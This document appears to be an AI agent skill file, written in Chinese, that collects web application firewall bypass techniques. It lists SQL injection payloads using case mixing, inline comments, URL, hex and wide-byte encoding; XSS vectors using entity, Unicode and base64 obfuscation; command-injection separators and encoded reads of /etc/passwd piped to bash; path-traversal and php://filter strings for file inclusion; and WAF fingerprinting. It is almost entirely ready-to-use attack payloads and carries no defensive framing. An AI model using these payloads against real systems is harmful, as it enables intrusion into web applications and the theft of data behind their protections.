---
name: waf-bypass
description: Use when encountering waf绕过综合技巧 - 涵盖sql注入、xss、rce、lfi等各类漏洞的waf绕过方法，包含编码、分块、协议滥用等技术
---

# WAF 绕过综合技巧

## Info

- **Tags**: waf, bypass, evasion, sql-injection, xss, rce

## SQL 注入 WAF 绕过

### 大小写混合
```sql
' UniOn SeLecT 1,2,3--
' UNION/**/SELECT/**/1,2,3--
```

### 注释绕过
```sql
' UNION/*comment*/SELECT/*comment*/1,2,3--
' UNION/*!SELECT*/1,2,3--  -- MySQL 内联注释
```

### 编码绕过
```sql
-- URL 编码
%27%20UNION%20SELECT%201,2,3--

-- 双重 URL 编码
%2527%2520UNION%2520SELECT

-- 十六进制编码
' UNION SELECT 0x61646d696e--

-- 宽字节注入（GBK）
%df' UNION SELECT 1,2,3--
```

### 字符串拼接
```sql
-- MySQL
' UNION SELECT CONCAT(c,o,l,umn) FROM table--
' UNION SELECT CONCAT_WS(':',user(),version(),database())--

-- 字符串截取
' UNION SELECT SUBSTR(password,1,1) FROM users--
```

### HTTP 参数污染
```
?id=1&id=2&id=3  -- 某些 WAF 只检查第一个参数
?id=1& id=2      -- 空格绕过
```

## XSS WAF 绕过

### 编码绕过
```html
<!-- HTML 实体编码 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Unicode 编码 -->
<img src=x onerror=\u0061lert(1)>

<!-- Base64 -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### 标签绕过
```html
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

### 过滤器绕过
```html
<!-- script 被过滤 -->
<img src=1 onerror="document.write('<scr'+'ipt>alert(1)</scr'+'ipt')">

<!-- alert 被过滤 -->
<img src=x onerror="confirm(1)">
<img src=x onerror="prompt(1)">
```

## RCE WAF 绕过

### 命令分隔符
```bash
; ls
| ls
|| ls
&& ls
& ls
$(ls)
`ls`
```

### 命令拼接
```bash
# 变量拼接
a=cat;b=/etc/passwd;$a $b

# 编码绕过
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# 进制转换
$(printf "\x63\x61\x74") /etc/passwd
```

### 空格绕过
```bash
cat${IFS}/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
```

## LFI WAF 绕过

```
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
php://filter/convert.base64-encode/resource=../../../etc/passwd
```

## WAF 识别与指纹

```bash
# 识别 WAF 类型
wafw00f http://target

# 常见 WAF 特征
# Cloudflare: 403 Forbidden, cf-ray header
# 安全狗: Server: Safedog
# 雷池: X-Powered-By: SafeLine
# 宝塔: bt-waf header
```
